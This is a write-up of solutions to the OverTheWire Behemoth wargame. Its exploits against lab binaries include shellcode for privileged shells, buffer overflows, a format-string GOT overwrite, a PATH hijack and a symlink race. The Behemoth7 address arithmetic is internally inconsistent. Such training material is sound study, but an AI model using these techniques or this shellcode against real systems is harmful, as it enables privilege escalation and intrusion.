---
layout: post
title: "[OverTheWire] Behemoth Wargame Solutions"
date: 2025-10-08
categories: [OverTheWire, Behemoth]
---

# {{ page.title }}

## Behemoth Wargame Brief
*"This wargame deals with a lot of regular vulnerabilities found commonly 'out 
in the wild'. While the game makes no attempts at emulating a real environment
it will teach you how to exploit several of the most common coding mistakes 
including buffer overflows, race conditions and privilege escalation."*

All challenge files are located in **/behemoth/**.\
Once a challenge is solved, the password for the next challenge can be located in **/etc/behemoth_pass/behemoth{challenge number}**.

**OverTheWire Behemoth Wargame:** [https://overthewire.org/wargames/behemoth/](https://overthewire.org/wargames/behemoth/)

**Difficulty:** 3/10

**Host:** behemoth.labs.overthewire.org\
**Port:** 2221

---
---
## Challenge Solutions:
- [Behemoth0 Solution](#behemoth0-solution)
- [Behemoth1 Solution](#behemoth1-solution)
- [Behemoth2 Solution](#behemoth2-solution)
- [Behemoth3 Solution](#behemoth3-solution)
- [Behemoth4 Solution](#behemoth4-solution)
- [Behemoth5 Solution](#behemoth5-solution)
- [Behemoth6 Solution](#behemoth6-solution)
- [Behemoth7 Solution](#behemoth7-solution)

---
---
## Behemoth0 Solution
**Username:** behemoth0\
**Password:** behemoth0

### Exploit:
When running the binary, the user is prompted to enter a password. Entering a random string will casue the program to print *"Access denied."* and exit.

```nasm
0x0804924e <+65>:    call   0x8049050 <printf@plt>
0x08049253 <+70>:    add    esp,0x4
0x08049256 <+73>:    lea    eax,[ebp-0x49]
0x08049259 <+76>:    push   eax
0x0804925a <+77>:    push   0x804a054
0x0804925f <+82>:    call   0x80490c0 <__isoc99_scanf@plt>
0x08049264 <+87>:    add    esp,0x8
0x08049267 <+90>:    lea    eax,[ebp-0x55]
0x0804926a <+93>:    push   eax
0x0804926b <+94>:    call   0x80490b0 <strlen@plt>
0x08049270 <+99>:    add    esp,0x4
0x08049273 <+102>:   push   eax
0x08049274 <+103>:   lea    eax,[ebp-0x55]
0x08049277 <+106>:   push   eax
0x08049278 <+107>:   call   0x80491e6 <memfrob>
0x0804927d <+112>:   add    esp,0x8
0x08049280 <+115>:   lea    eax,[ebp-0x55]
0x08049283 <+118>:   push   eax
0x08049284 <+119>:   lea    eax,[ebp-0x49]
0x08049287 <+122>:   push   eax
0x08049288 <+123>:   call   0x8049030 <strcmp@plt>      <-
0x0804928d <+128>:   add    esp,0x8
0x08049290 <+131>:   test   eax,eax
0x08049292 <+133>:   jne    0x80492c6 <main+185>
0x08049294 <+135>:   push   0x804a059
0x08049299 <+140>:   call   0x8049080 <puts@plt>
0x0804929e <+145>:   add    esp,0x4
0x080492a1 <+148>:   call   0x8049070 <geteuid@plt>
0x080492a6 <+153>:   mov    ebx,eax
0x080492a8 <+155>:   call   0x8049070 <geteuid@plt>
0x080492ad <+160>:   push   ebx
0x080492ae <+161>:   push   eax
0x080492af <+162>:   call   0x80490a0 <setreuid@plt>
0x080492b4 <+167>:   add    esp,0x8
0x080492b7 <+170>:   push   0x804a06a
0x080492bc <+175>:   call   0x8049090 <system@plt>
0x080492c1 <+180>:   add    esp,0x4
```
Disassembling the binary using **objdump** or the **disassemble** command within **GDB**, it shows that the `strcmp()` function is used to compare the value entered by the user against a fixed string. If the correct input is provided, then a shell is spawned via a `system()` function call.

A simple way to find what the string is that the input is being compared against, is to run the binary using `ltrace`. This will show all calls to library functions, including `strcmp()`, as well as the arguments passed to them, such as the fixed comparison string.

```bash
behemoth0@behemoth:/behemoth$ ltrace ./behemoth0
__libc_start_main(0x80490fd, 1, 0xffffd454, 0 <unfinished ...>
printf("Password: ")
__isoc99_scanf(0x804a054, 0xffffd34f, 0x804a008, 0x804a020Password: test
)
strlen("OK^GSYBEX^Y")
strcmp("test", "eatmyshorts")
puts("Access denied.."Access denied..
)
+++ exited (status 0) +++
```
This reveals that the expected "password" is actually the string *"eatmyshorts"*.\
Running the binary again and entering the correct input spawns an interactive shell.

```bash
behemoth0@behemoth:/behemoth$ ./behemoth0
Password: eatmyshorts
Access granted..
$ whoami
behemoth1
```

---
---
## Behemoth1 Solution
**Username:** behemoth1\
**Password:** [REDACTED]

### Disassembly:
```nasm
Dump of assembler code for function main:
   0x08049186 <+0>:     push   ebp
   0x08049187 <+1>:     mov    ebp,esp
   0x08049189 <+3>:     sub    esp,0x44
   0x0804918c <+6>:     push   0x804a008
   0x08049191 <+11>:    call   0x8049040 <printf@plt>
   0x08049196 <+16>:    add    esp,0x4
   0x08049199 <+19>:    lea    eax,[ebp-0x43]
   0x0804919c <+22>:    push   eax
   0x0804919d <+23>:    call   0x8049050 <gets@plt>
   0x080491a2 <+28>:    add    esp,0x4
   0x080491a5 <+31>:    push   0x804a014
   0x080491aa <+36>:    call   0x8049060 <puts@plt>
   0x080491af <+41>:    add    esp,0x4
   0x080491b2 <+44>:    mov    eax,0x0
   0x080491b7 <+49>:    leave
   0x080491b8 <+50>:    ret
```
Disassembling the `main()` function shows that it only performs 4 interesting actions. The first thing it does is subtract `0x44` from `esp`, this is done to define a buffer.
```nasm
0x08049189 <+3>:     sub    esp,0x44
...
0x08049196 <+16>:    add    esp,0x4
0x08049199 <+19>:    lea    eax,[ebp-0x43]
```
The final buffer size is 67-bytes (**0x43**).\
After defining the buffer, the `printf()` function is called to print a string before calling the `gets()` function to take input from **stdin** and write it into the defined buffer, then finally it calls the `puts()` function to print another string.

There is a **Buffer Overflow** vulnerability in this binary due to the use of `gets()` which has no bounds checking, meaning if an input larger than the defined buffer's size is provided, then it will fill the buffer and continue to overwrite values on the stack.

Absuing the **Buffer Overflow** vulnerability, it is possible to overwrite the return address to point to any address we want. To overwrite the the return address (**EIP**) we would have to supply an input of 67-bytes to fill the buffer, plus 4-bytes to overwrite the **EBP**, plus a final 4-bytes to overwrite the **EIP**, making the offset `71-bytes + EIP`.

```bash
[+] checksec for '/behemoth/behemoth1'
Canary                        : ✘
NX                            : ✘
PIE                           : ✘
Fortify                       : ✘
RelRO                         : ✘
```
Running `checksec` on the bianry to show the protections in place, it shows that there are none. Most importantly `NX` (**Non eXecutable stack**) which means we can place some shellcode somewhere on the stack and overwrite the return address with the address of our shellcode to execute it.

### Exploit:
There are a few ways to get shellcode onto the stack, one of which is to write the shellcode before the return address or after the return address within our initial input to the binary. This works well when performing attacks remotely.\
However, as we have access to the machine, we can use another method which involves writing the shellcode into an environment variable, finding the address of the environment variable on the stack, and then overwriting the return address with that address.

To find the address of an environment address on the stack, I use this C script.
```c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char* argv[])
{
  printf("%s is at %p\n", argv[1], getenv(argv[1]));
}
```
Compile the binary.
```bash
gcc -m32 -o /tmp/find_env /tmp/find_env.c
```
Finally, call the binary and pass the name of an environment variable in `argv[1]`.

I am going to use [shellcode](/shellcode/asm-02.html) that spawns a shell using `execve("/bin/sh", ["/bin/sh", "-p"])` to maintain privileges when the shell is spawned.

```bash
behemoth1@behemoth:/behemoth$ export SHELLCODE=$(perl -e 'print "\x90"x20 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
behemoth1@behemoth:/behemoth$ /tmp/find_env SHELLCODE
SHELLCODE is at 0xffffd5a0
behemoth1@behemoth:/behemoth$ ( perl -e 'print "A"x71 . "\xa0\xd5\xff\xff"'; cat; ) | ./behemoth1
whoami
behemoth2
```

---
## Behemoth2 Solution
**Username:** behemoth2\
**Password:** [REDACTED]

### Disassembly:
```c
char var_8c;
sprintf(&var_8c, "touch %d", getpid());
void var_78;

if ((lstat(var_90, &var_78) & 0xf000) != 0x8000)
{
    unlink(var_90);
    uid_t euid = geteuid();
    setreuid(geteuid(), euid);
    system(&var_8c);
}
```
Disassembling the binary and focussing on the `main()` function, it's clear that it formats a string to build the command `touch {PID}` where the **PID** is the Process ID of the current process (the binary being run) and then runs the command by passing it to the `system()` function.\
This is vulnerable to **PATH Manipulation** due to the full path to the `touch` binary not being used. When it calls `touch` it searches for the first instance of the binary in the **PATH** environment variable.

To exploit this, we can create our own `touch` *binary*, in a directory we have permissions to write to, which performs whatever actions we want and then modify the **PATH** environment variable to point to the directory where our *binary* exists first.

### Exploit:
```bash
behemoth2@behemoth:/tmp/pm$ echo -e '#!/bin/bash\n/bin/bash -p' > touch
behemoth2@behemoth:/tmp/pm$ chmod +x touch
behemoth2@behemoth:/tmp/pm$ export PATH="/tmp/pm:$PATH"
behemoth2@behemoth:/tmp/pm$ /behemoth/behemoth2
behemoth3@behemoth:/tmp/pm$ whoami
behemoth3
```

---
---
## Behemoth3 Solution
**Username:** behemoth3\
**Password:** [REDACTED]

### Disassembly:
Running the binary, it prompts the user to enter a name. Once a value is entered, it will print the string `Welcome, {name}`. The value entered is reflected back.
```bash
behemoth3@behemoth:/behemoth$ ./behemoth3
Identify yourself: shellcodex
Welcome, shellcodex

aaaand goodbye again.
```

Running the binary again and entering a value such as `%p`, it leaks values from the stack, revealing a **Format String** vulnerability. The reason this works, is because when the code was written, the `printf()` function was used to build a formatted string combining the string *"Welcome, "* and the user's input. However, no format specifier such as `%s` (**string**) was specified meaning the user can supply them within their input and leak values from the stack based upon the specifier used.
```bash
behemoth3@behemoth:/behemoth$ ./behemoth3
Identify yourself: AAAA.%p.%p.%p.%p
Welcome, AAAA.0x41414141.0x2e70252e.0x252e7025.0x70252e70

aaaand goodbye again.
```

Running `checksec` on the binary to find out the protections in place, it shows that there are no protections.
```bash
[+] checksec for '/behemoth/behemoth3'
Canary                        : ✘
NX                            : ✘
PIE                           : ✘
Fortify                       : ✘
RelRO                         : ✘
```
Most importantly, there is **No RelRO** which means that the **GOT** (*Global Offset Table*) is writable at runtime.

```nasm
0x08049186 <+0>:     push   ebp
0x08049187 <+1>:     mov    ebp,esp
0x08049189 <+3>:     sub    esp,0xc8
0x0804918f <+9>:     push   0x804a008
0x08049194 <+14>:    call   0x8049040 <printf@plt>
0x08049199 <+19>:    add    esp,0x4
0x0804919c <+22>:    mov    eax,ds:0x804b240
0x080491a1 <+27>:    push   eax
0x080491a2 <+28>:    push   0xc8
0x080491a7 <+33>:    lea    eax,[ebp-0xc8]
0x080491ad <+39>:    push   eax
0x080491ae <+40>:    call   0x8049050 <fgets@plt>
0x080491b3 <+45>:    add    esp,0xc
0x080491b6 <+48>:    push   0x804a01c
0x080491bb <+53>:    call   0x8049040 <printf@plt>
0x080491c0 <+58>:    add    esp,0x4
0x080491c3 <+61>:    lea    eax,[ebp-0xc8]
0x080491c9 <+67>:    push   eax
0x080491ca <+68>:    call   0x8049040 <printf@plt>
0x080491cf <+73>:    add    esp,0x4
0x080491d2 <+76>:    push   0x804a026
0x080491d7 <+81>:    call   0x8049060 <puts@plt>
0x080491dc <+86>:    add    esp,0x4
0x080491df <+89>:    mov    eax,0x0
0x080491e4 <+94>:    leave
0x080491e5 <+95>:    ret
```
Decompiling the `main()` function, it shows that only 3 functions are called: `printf()`, `fgets()`, and `puts()`. The `puts()` function is the last to be called, to exploit this binary we can overwrite the **GOT** address of `puts()` with the address of what we want to call instead of it, such as some shellcode.

### Exploit:
To exploit this binary, I am going to use the same shellcode that I used in the **Behemoth1** challenge that spawns a shell using `execve("/bin/sh", ["/bin/sh", "-p"])` to maintain privileges. I am also going to put the shellcode into an environment variable and use the `find_env` script to locate the address of the environment variable on the stack.

To build a format string payload to overwrite the **GOT** address of `puts()` with the address of our shellcode, I am going to use a `pwntools` script.

```python
from pwn import *

context.binary = binary = ELF("/behemoth/behemoth3", chekcsec=False)
context.log_level = "CRITICAL"

payload = fmtstr_payload(offset=1, writes={binary.got.puts: <ADDRESS_OF_SHELLCODE>})

p = process()
p.sendline(payload)
p.interactive()
```

```bash
behemoth3@behemoth:/tmp/exp$ export SHELLCODE=$(perl -e 'print "\x90"x20 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')

behemoth3@behemoth:/tmp/exp$ /tmp/find_env SHELLCODE
SHELLCODE is at 0xffffd5a9

behemoth3@behemoth:/tmp/exp$ python3 exploit.py
Identify yourself: Welcome,                                                                                      

$ whoami
behemoth4
```

---
---
## Behemoth4 Solution
**Username:** behemoth4\
**Passowrd:** [REDACTED]

### Disassembly:
```c
sprintf(&var_28, "/tmp/%d", getpid());
FILE* fp = fopen(&var_28, "r");

if (fp)
{
    sleep(1);
    puts("Finished sleeping, fgetcing");
    
    while (true)
    {
        int32_t c = fgetc(fp);
        
        if (c == 0xffffffff)
            break;
        
        putchar(c);
    }
    
    fclose(fp);
}
else
    puts("PID not found!");
```
Running the binary, it simply just prints *"PID not found!"* and then exits. After disassembling the main function we can see that it first builds a file path using a format string, combining the string *"/tmp/"* and the current **Process ID** of the running binary.

It then attempts to open the file using the formatted file path string in read-only mode.\
If it was able to open the file, then it reads a single character from the file pointer and then outputs it, looping through until there is nothing left to print, before closing the file and exiting.\
However, if it could not open the file (if it does not exist), then it will output the message *"PID not found!"*.

### Exploit:
This is a **race condition** vulnerability. If we can create a symlink pointing to the password file (*/etc/behemoth_pass/behemoth5*) at the path **/tmp/{PID}** quick enough, then the binary will be able to open the password file and output the password.

The `kill` command can be used to **STOP** and **CONTINUE** processes, we will build a simple **bash** script using `kill` commands to exploit the binary.

```bash
#!/bin/bash

/behemoth/behemoth4 &   # Run the binary and background the process
PID=$!                  # Get the PID of the created process (the running binary)
kill -STOP $PID         # STOP the running binary process
ln -s /etc/behemoth_pass/behemoth5 /tmp/$PID  # Create a symlink pointing to the password file
kill -CONT $PID         # CONTINUE the running binary process
```

```bash
behemoth4@behemoth:/tmp/.work$ ./solve.sh
Finished sleeping, fgetcing
m[REDACTED]4
```

---
---
## Behemoth5 Solution
**Username:** behemoth5\
**Password:** [REDACTED]

### Disassembly:
```c
FILE* fp = fopen("/etc/behemoth_pass/behemoth6", "r");

if (!fp)
{
    perror("fopen");
    exit(1);
    /* no return */
}

fseek(fp, 0, 2);
int32_t var_3c_2 = ftell(fp) + 1;
rewind(fp);
char* buf = malloc(var_3c_2);
fgets(buf, var_3c_2, fp);
buf[strlen(buf)] = 0;
fclose(fp);
struct hostent* eax_7 = gethostbyname("localhost");

if (!eax_7)
{
    perror("gethostbyname");
    exit(1);
    /* no return */
}

int32_t fd = socket(2, 2, 0);

if (fd == 0xffffffff)
{
    perror("socket");
    exit(1);
    /* no return */
}

int16_t addr = 2;
int16_t var_22 = htons(atoi("1337"));
int32_t var_20 = **eax_7->h_addr_list;
void var_1c;
memset(&var_1c, 0, 8);

if (sendto(fd, buf, strlen(buf), 0, &addr, 0x10) != 0xffffffff)
{
    close(fd);
    exit(0);
    /* no return */
}

perror("sendto");
exit(1);
```

This challenge is somewhat straight forward with some understanding of how sockets work and the arguments passed when creating a socket.

The first thing that happens, is the password file (**/etc/behemoth_pass/behemoth6**) is opened in read-only mode and the contents of the file are read.\
It then creates a **UDP** socket to send data to **localhost** on port **1337**. Once the socket is created, the contents of the password file are sent via the socket.

### Exploit:
To solve this, all we need to do is use the `screen` command to create a *second terminal*, run a **UDP** listener on port **1337**, detach the screen and run the binary, and then re-attach the screen to see the password.

```bash
# Main terminal
behemoth5@behemoth:/behemoth$ screen -S listener

# In new screen
behemoth5@behemoth:/behemoth$ nc -ulp 1337
# Press CTRL+a then d to background the screen

# Run the binary in the main terminal
behemoth5@behemoth:/behemoth$ ./behemoth5
# Re-attach the screen
behemoth5@behemoth:/behemoth$ screen -r

# The password has been received on the listener
j[REDACTED]C
```

---
---
## Behemoth6 Solution
**Username:** behemoth6\
**Password:** [REDACTED]

For this challenge, there are two binaries **behemoth6** and **behemoth6_reader**.

### Disassembly:
```c
FILE* fp = popen("/behemoth/behemoth6_reader", "r");

if (!fp)
{
    puts("Failed to create pipe.");
    exit(0);
    /* no return */
}

char* buf = malloc(0xa);
fread(buf, 0xa, 1, fp);
pclose(fp);

if (strcmp(buf, "HelloKitty"))
    puts("Incorrect output.");
else
{
    puts("Correct.");
    uid_t euid = geteuid();
    setreuid(geteuid(), euid);
    execl("/bin/sh", "sh", 0);
}
```
The first binary (**behemoth6**) runs the second binary (**behemoth6_reader**) and reads the output. It then compares the output against the string *"HelloKitty"*, if the output matches the string, then it spawns an interactive shell.

```c
int32_t fd = open("shellcode.txt", 0);
    
if (fd < 0)
{
    puts("Couldn't open shellcode.txt!");
    exit(1);
    /* no return */
}

void* eax = mmap(nullptr, 0x1000, 7, 2, fd, 0);
int32_t var_20 = 0;

while (true)
{
    if (var_20 > 0xfff)
    {
        eax(var_20, fd, eax, eax);
        return 0;
    }
    
    if (*(eax + var_20) == 0xb)
        break;
    
    var_20 += 1;
}

puts("Write your own shellcode.");
exit(1);
```
The second binary (**behemoth6_reader**) reads shellcode from a file named **shellcode.txt**, maps it into memory and makes it executable, and then executes it. However, there is a caveat, it checks each byte in the shellcode. If the byte is **0xb** then it breaks out of the loop, prints *"Write your own shellcode."* and does not execute it.

To solve this challenge, we need to write our own shellcode that prints out the string *"HelloKitty"* when executed.

### Exploit Setup:
```nasm
section .text
global _start

_start:
	xor ebx, ebx		; null ebx (0)
	mul ebx			; eax, ebx, edx = 0

	push eax		; push null terminator
	mov ax, 0x7974    	; move "ty" into ax
  	push ax           	; push "ty"
	push 0x74694b6f		; push "oKit"
	push 0x6c6c6548		; push "Hell"
	mov ecx, esp		; move pointer to "HelloKitty" into edi

  	xor eax, eax    	; null eax (0)
	mov al, 0x04		; move write syscall number into al (eax)
	mov bl, 0x1		; move 1 into ebx (1 = stdout)
	mov dl, 12		; move length of string (12) into dl
	int 0x80		; call write

	mov al, 0x1		; move exit syscall number into al (eax)
	xor ebx, ebx		; null ebx (0)
	int 0x80		; call exit
```

```bash
# Compile the assembly
nasm -f elf -o shellcode.o shellcode.asm

# Link
ld -m elf_i386 -o shellcode shellcode.o

# Extract Shellcode
printf '\\x' && objdump -d shellcode | grep "^ " | cut -f2 | tr -d ' ' | tr -d '\n' | sed 's/.\{2\}/&\\x /g'| head -c-3 | tr -d ' ' && echo ' '

# Write the output into a file named shellcode.txt
perl -e 'print "\x31\xdb\xf7\xe3\x50\x66\xb8\x74\x79\x66\x50\x68\x6f\x4b\x69\x74\x68\x48\x65\x6c\x6c\x89\xe1\x31\xc0\xb0\x04\xb3\x01\xb2\x0c\xcd\x80\xb0\x01\x31\xdb\xcd\x80"' > ./shellcode.txt
```

### Exploit:
Run the challenge binary **behemoth6**, which will run the secondary binary **behemoth6_reader** reading the shellcode, checking it, and executing it.

```bash
behemoth6@behemoth:/tmp/sc$ /behemoth/behemoth6
Correct.
$ whoami
behemoth7
```

---
---
## Behemoth7 Solution
**Username:** behemoth7\
**Password:** [REDACTED]

### Disassembly:
```c
while (*var_8)
  {
      if (var_10 > 0x1ff)
          break;
      
      var_10 += 1;
      uint16_t* edx_7 = *__ctype_b_loc();
      
      if (!(edx_7[*var_8] & 0x400))
      {
          uint16_t* edx_8 = *__ctype_b_loc();
          
          if (!(edx_8[*var_8] & 0x800))
          {
              fprintf(__bss_start, "Non-%s chars found in string, possible shellcode!\n", 
                  "alpha");
              exit(1);
              /* no return */
          }
      }
      
      var_8 = &var_8[1];
  }
  
  char var_210[0x200];
  strcpy(&var_210, *(arg2 + 4));
```
This binary takes input via `argv[1]`. It defines a buffer of 512-bytes and uses the `strcpy()` function to copy the input from `argv[1]` into the defined buffer.

There is a **Buffer Overflow** in this binary caused by the `strcpy()` function which has no bounds checking. If a provided input is larger in size than the size of the defined buffer, then it will fill the buffer and continue to write onto the stack, overwriting values such as the return address (**EIP**).

To solve this challenge, we can put shellcode on the stack and overwrite the return address with the address of our shellcode. However, this binary does two important things. The first is is *nullifies* all environment variables, so we cannot put shellcode within an environment variable, and the second thing it does is iterate through each byte of the input and verify that it is an alphanumeric character. If it is not, then it breaks out of the loop, prints *"Non-alpha chars found in string, possible shellcode!"*, and exits.\
These both happen before `strcpy()` is called.

To get around this, we can put the shellcode *after* the return address but still within our input. This keeps it out of an environment variable and also enables us to bypass the alphanumeric check.

### Exploit Setup:
First, we need to find the offset before we overwrite the return address. We can do this within **GDB-GEF**.
```bash
──── registers ────
$eax   : 0x0
$ebx   : 0xf7fade34  →  ",\r#"
$ecx   : 0xffffd5a0  →  "aafxaafyaaf"
$edx   : 0xffffd149  →  "aafxaafyaaf"
$esp   : 0xffffd110  →  "iaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafua[...]"
$ebp   : 0x66616167 ("gaaf"?)
$esi   : 0xffffd1d0  →  0xffffd5ac  →  0x00000000
$edi   : 0xf7ffcb60  →  0x00000000
$eip   : 0x66616168 ("haaf"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63
──── stack ────
0xffffd110│+0x0000: "iaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafua[...]"    ← $esp
0xffffd114│+0x0004: "jaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafva[...]"
0xffffd118│+0x0008: "kaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwa[...]"
0xffffd11c│+0x000c: "laafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxa[...]"
0xffffd120│+0x0010: "maafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafya[...]"
0xffffd124│+0x0014: "naafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaaf"
0xffffd128│+0x0018: "oaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaaf"
0xffffd12c│+0x001c: "paafqaafraafsaaftaafuaafvaafwaafxaafyaaf"
──── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x66616168
──── threads ────
[!] Id 1, Name: "behemoth7", stopped 0x66616168 in ?? (), reason: SIGSEGV

gef>  pattern offset 0x66616168
[*] Searching for '68616166'/'66616168' with period=4
[*] Found at offset 528 (little-endian search) likely
```
The offset is calculated to be **528-bytes**.

To find the address of where the shellcode is to overwrite the return address with, we can use `ltrace` to find the address where `strcpy()` copies the input into.

```bash
behemoth7@behemoth:/behemoth$ ltrace ./behemoth7 AAAAAAAAAA
{SNIPPED}
strcpy(0xffffd17c, "AAAAAAAAAA")
```
The input is copied into the 512-byte buffer located at **0xffffd17c**.\
To calculate the address of the shellcode, we need to add `528-bytes (offset) + 4-bytes (Return Address)` onto the address **0xffffd17c**.
```bash
0xffffcf4c + (528 + 4)
= 0xffffd160
```

I added a 20-byte buffer of **NOPs** between the return address and the shellcode, so I am going to add another 10-bytes onto the calculated return address for a final return address of `0xffffd16a`.

### Exploit:
```bash
behemoth7@behemoth:/behemoth$ ./behemoth7 $(perl -e 'print "A"x528 . "\x6a\xd1\xff\xff" . "\x90"x20 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\
x69\x6e\x89\xe3\x50\x66\x68\x2d\x70\x89\xe1\x50\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"')
$ whoami
behemoth8
```